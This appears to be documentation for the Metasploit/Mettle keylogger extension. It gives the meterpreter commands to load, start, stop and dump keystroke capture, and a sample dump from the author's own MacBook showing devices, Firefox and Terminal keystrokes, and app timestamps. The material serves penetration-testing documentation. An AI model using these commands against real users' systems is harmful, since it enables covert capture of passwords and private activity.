KEYLOGGER EXTENSION
===================

This loadable extension allows users to capture keystrokes, application starting and stopping, and keyboard devices being conneted or removed from a target.

Loading the Keylogger
---------------------

Once you've established a connection to Mettle, you can load the keylogger extension with the following command in your msfconsole terminal:

`load keylogger`

If things go according to plan, you should get a message that the extension was successfully loaded:

```
meterpreter > load keylogger
Loading extension keylogger...Success.
```

Using the Keylogger
-------------------

The keylogger commands operate on a similar paradigm as the sniffer extension commands do.  You can see the available commands with `help` in your msfconsole terminal:

```
Keylogger Commands
==================

    Command            Description
    -------            -----------
    keylogger_dump     Retrieve keylogged data
    keylogger_release  Free keylogged data instead of downloading
    keylogger_start    Start keylogging
    keylogger_status   View keylogging status
    keylogger_stop     Stop keylogging
```

An Example
----------

In this example, I will start the keylogger on my target MacBook and then do the following:

* attach a keyboard
* start the Firefox browser
* type `archive.org` in the URL and press ENTER
* in the search box on archive.org's website, type `geocities.com` and press ENTER

Then I'll stop the keylogger and dump/download the activity to my Metasploit framework instance.

```
meterpreter > keylogger_start
[*] Keylogger capture started
meterpreter > keylogger_stop
[*] Keylogger capture stopped
meterpreter > keylogger_dump
========== Devices/7-3-2018/Time Stamps ==========
Connected - Wednesday, March 7, 2018 at 2:20:28 PM Central Standard Time	<IOHIDDevice 0x7fd21e507a80 [0x7fffa24b0980] 'ClassName=IOUSBHostHIDDevice'  Transport=USB VendorID=1241 ProductID=41265 Manufacturer=HOLTEK Product=USB-HID Keyboard PrimaryUsagePage=1 PrimaryUsage=2 ReportInterval=8000>
Connected - Wednesday, March 7, 2018 at 2:20:28 PM Central Standard Time	<IOHIDDevice 0x7fd21e436a60 [0x7fffa24b0980] 'ClassName=IOUSBHostHIDDevice'  Transport=USB VendorID=1241 ProductID=41265 Manufacturer=HOLTEK Product=USB-HID Keyboard PrimaryUsagePage=1 PrimaryUsage=6 ReportInterval=8000>


========== Key/7-3-2018/Terminal ==========

Wednesday, March 7, 2018 at 2:20:25 PM Central Standard Time

Wednesday, March 7, 2018 at 2:20:55 PM Central Standard Time
keylogger\RS(-)stop

========== Key/7-3-2018/Firefox ==========

Wednesday, March 7, 2018 at 2:20:38 PM Central Standard Time
archib\DELETE|BACKSPACEve.org
geocities.com


========== App/7-3-2018/Time Stamps of Apps ==========
Wednesday, March 7, 2018 at 2:20:33 PM Central Standard Time	Firefox
Wednesday, March 7, 2018 at 2:20:54 PM Central Standard Time	Terminal
```

You can see in the above that the following were captured:

* my keyboard device being conneted to the system
  * I believe it enumerates as two types of keyboards/keypads, hence the two entries
* my terminal application was in use, including the command I typed to stop the keylogger
* my Firefox application was active
  * including the archive.org (and the typo and backspace I had to do to correct it!)
  * including the geocities.com I typed in the serach box of the archive.org web page
* the timestamps of when I used the Firefox and Terminal applications
